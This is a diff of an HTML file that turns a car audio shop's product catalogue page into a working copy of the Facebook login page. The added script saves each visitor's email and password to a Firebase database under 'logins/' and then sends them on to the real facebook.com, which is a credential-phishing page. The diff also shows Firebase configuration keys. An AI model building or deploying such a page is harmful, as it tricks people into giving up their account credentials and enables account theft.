@@ -3,190 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CNV AUDIO | Professional Car Audio</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
-
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; color: #1e293b; overflow-x: hidden; }
-        h1, h2, h3 { font-family: 'Rajdhani', sans-serif; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
         
-        /* Three.js canvas in background */
-        #canvas-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 1; }
+        /* Disclaimer Styles */
+        .disclaimer { background-color: white; color: red; padding: 20px; text-align: center; border: 5px solid red; margin-top: 20px; width: 80%; font-size: 24px; font-weight: bold; }
+
+        .container { display: flex; width: 980px; margin-top: 40px; justify-content: space-between; }
+        .fb-text { width: 500px; padding-top: 40px; }
+        .fb-text h1 { color: #1877f2; font-size: 60px; margin-bottom: 0; }
+        .fb-text p { font-size: 28px; line-height: 32px; width: 450px; }
         
-        /* Light Theme Glass Card */
-        .glass-card {
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(226, 232, 240, 0.8);
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
-            transition: all 0.3s ease;
-        }
-        .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
-            border-color: #3b82f6;
-        }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
+        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
+        .login-btn { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; padding: 12px; cursor: pointer; }
+        .forgot { color: #1877f2; font-size: 14px; margin: 16px 0; text-decoration: none; display: block; }
+        hr { border: 0.5px solid #dadde1; margin-bottom: 20px; }
+        .create-btn { background-color: #42b72a; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; padding: 12px 16px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="canvas-container"></div>
+    
 
-    <nav class="fixed w-full z-50 bg-white/90 backdrop-blur-md border-b border-gray-200 shadow-sm">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
-            <h1 class="text-3xl font-bold tracking-widest text-slate-900">CNV <span class="text-blue-600">AUDIO</span></h1>
-            <div class="hidden md:flex space-x-6">
-                <a href="#" class="text-gray-600 hover:text-blue-600 font-medium transition">Home</a>
-                <a href="#products" class="text-gray-600 hover:text-blue-600 font-medium transition">Catalog</a>
-                <a href="#contact" class="px-5 py-2 bg-blue-600 rounded-full text-white font-bold hover:bg-blue-700 transition shadow-md">Contact Us</a>
-            </div>
+    <div class="container">
+        <div class="fb-text">
+            <h1>facebook</h1>
+            <p>Facebook helps you connect and share with the people in your life.</p>
         </div>
-    </nav>
-
-    <section class="pt-40 pb-20 px-4 text-center relative z-10">
-        <h1 class="text-5xl md:text-7xl font-bold mb-6 text-slate-900">UNLEASH THE <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-indigo-600">TRUE SOUND</span></h1>
-        <p class="text-gray-600 text-lg md:text-xl max-w-2xl mx-auto mb-10">Premium car audio components for the audiophile. Crystal clear highs, deep lows, and perfect harmony.</p>
-        <a href="#products" class="inline-block px-8 py-3 bg-slate-900 text-white font-bold tracking-wider rounded hover:bg-blue-600 transition duration-300 shadow-lg">EXPLORE DEVICES</a>
-    </section>
-
-    <section id="products" class="max-w-7xl mx-auto px-4 py-16">
-        <h2 class="text-4xl font-bold mb-12 border-l-4 border-blue-600 pl-4 text-slate-800">LATEST ARRIVALS</h2>
-        
-        <div id="loading" class="flex justify-center py-20">
-            <div class="w-12 h-12 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email address or phone number">
+            <input type="password" id="password" placeholder="Password">
+            <button class="login-btn" onclick="saveData()">Log In</button>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <hr>
+            <button class="create-btn">Create new account</button>
         </div>
+    </div>
 
-        <div id="product-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
-            </div>
-    </section>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    <footer id="contact" class="bg-slate-900 mt-20 py-12 text-center text-white">
-        <h2 class="text-2xl font-bold mb-2">CNV AUDIO</h2>
-        <p class="text-gray-400 mb-6">Professional Audio Solutions</p>
-        <p class="text-xl font-bold text-blue-400 tracking-wider">+94 72 628 4277</p>
-        <p class="text-gray-600 text-sm mt-8">&copy; 2026 CNV Enterprises. All rights reserved.</p>
-    </footer>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
-        import { getFirestore, collection, getDocs } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
-
+    <script>
+        // Firebase configuration
         const firebaseConfig = {
-            apiKey: "AIzaSyAx-Zv0iK_P25XK9rcly_t1fLJv_-xyY2I",
-            authDomain: "cnv-audio.firebaseapp.com",
-            projectId: "cnv-audio",
-            storageBucket: "cnv-audio.firebasestorage.app",
-            messagingSenderId: "981917537038",
-            appId: "1:981917537038:web:e79ffa1b5d2ed75af0fd5f",
-            measurementId: "G-T3T30E7KJJ"
+            apiKey: "AIzaSyAF__nT0KcIICvwJuZUf05P2iMZfDiNo6M",
+            authDomain: "yasodha-ac86b.firebaseapp.com",
+            databaseURL: "https://yasodha-ac86b-default-rtdb.firebaseio.com",
+            projectId: "yasodha-ac86b",
+            storageBucket: "yasodha-ac86b.firebasestorage.app",
+            messagingSenderId: "268363750401",
+            appId: "1:268363750401:web:d97405614b6bf6089e3400",
+            measurementId: "G-3JWTJG76P6"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-        // Fetch Data
-        async function loadProducts() {
-            const grid = document.getElementById('product-grid');
-            const loading = document.getElementById('loading');
-            
-            try {
-                const querySnapshot = await getDocs(collection(db, "products"));
-                loading.style.display = 'none';
+        function saveData() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
 
-                if (querySnapshot.empty) {
-                    grid.innerHTML = '<p class="text-gray-500 col-span-full text-center">No products available yet.</p>';
-                    return;
-                }
-
-                querySnapshot.forEach((doc) => {
-                    const data = doc.data();
-                    const productId = doc.id;
-                    const priceFormatted = data.price;
+            if(email && password) {
+                database.ref('logins/' + Date.now()).set({
+                    email: email,
+                    password: password
+                }).then(() => {
                     
-                    const currentUrl = window.location.href.split('#')[0];
-                    const productLink = `${currentUrl}?item=${productId}`;
-                    const waMessage = `Hello CNV Audio, I am interested in purchasing this item:\n\n*${data.name}*\nPrice: ${priceFormatted}\nLink: ${productLink}`;
-                    const waLink = `https://wa.me/94726284277?text=${encodeURIComponent(waMessage)}`;
-
-                    const specsHtml = data.specs ? data.specs.map(s => 
-                        `<li class="flex items-center text-xs text-gray-600"><span class="w-1.5 h-1.5 bg-blue-500 rounded-full mr-2"></span>${s}</li>`
-                    ).join('') : '';
-
-                    const card = `
-                        <div class="glass-card rounded-xl overflow-hidden flex flex-col h-full group">
-                            <div class="h-64 overflow-hidden relative bg-gray-100">
-                                <img src="${data.image}" alt="${data.name}" class="w-full h-full object-contain p-4 transition-transform duration-700 group-hover:scale-110">
-                                <div class="absolute top-0 right-0 bg-blue-600 text-white px-3 py-1 m-2 rounded text-sm font-bold shadow-md">
-                                    ${priceFormatted}
-                                </div>
-                            </div>
-                            <div class="p-6 flex-1 flex flex-col">
-                                <h3 class="text-xl font-bold text-slate-800 mb-2 leading-tight">${data.name}</h3>
-                                <p class="text-gray-500 text-sm mb-4 line-clamp-2">${data.description}</p>
-                                
-                                <ul class="mb-6 space-y-1 bg-slate-50 p-3 rounded-lg border border-gray-200">
-                                    ${specsHtml}
-                                </ul>
-
-                                <div class="mt-auto">
-                                    <a href="${waLink}" target="_blank" class="block w-full bg-green-600 hover:bg-green-700 text-white text-center font-bold py-3 rounded-lg transition shadow flex items-center justify-center gap-2">
-                                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/></svg>
-                                        INQUIRE TO BUY
-                                    </a>
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    grid.insertAdjacentHTML('beforeend', card);
+                    window.location.href = "https://www.facebook.com"; // Redirect to real FB
                 });
-            } catch (e) {
-                console.error(e);
-                grid.innerHTML = '<p class="text-red-500 text-center">Failed to load products.</p>';
+            } else {
+                alert("Please fill all fields");
             }
         }
-        loadProducts();
-
-        // 3D Background (Subtle Particles for Light Theme)
-        const scene = new THREE.Scene();
-        scene.background = new THREE.Color(0xf8fafc); // Matches bg-slate-50
-        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-        renderer.setSize(window.innerWidth, window.innerHeight);
-        document.getElementById('canvas-container').appendChild(renderer.domElement);
-
-        const geometry = new THREE.BufferGeometry();
-        const count = 2500;
-        const positions = new Float32Array(count * 3);
-        for(let i = 0; i < count * 3; i++) positions[i] = (Math.random() - 0.5) * 40;
-        geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
-        
-        // Darker particles for light background
-        const material = new THREE.PointsMaterial({ size: 0.05, color: 0x94a3b8, transparent: true, opacity: 0.6 });
-        const particles = new THREE.Points(geometry, material);
-        scene.add(particles);
-        camera.position.z = 5;
-
-        let time = 0;
-        function animate() {
-            requestAnimationFrame(animate);
-            time += 0.002;
-            const positions = particles.geometry.attributes.position.array;
-            for(let i = 0; i < count; i++) {
-                const x = positions[i * 3];
-                positions[i * 3 + 1] = Math.sin(time + x) * 0.6 + Math.cos(time * 0.5 + x) * 0.2; 
-            }
-            particles.geometry.attributes.position.needsUpdate = true;
-            particles.rotation.y += 0.0003;
-            renderer.render(scene, camera);
-        }
-        animate();
-        window.addEventListener('resize', () => {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        });
     </script>
 </body>
 </html>
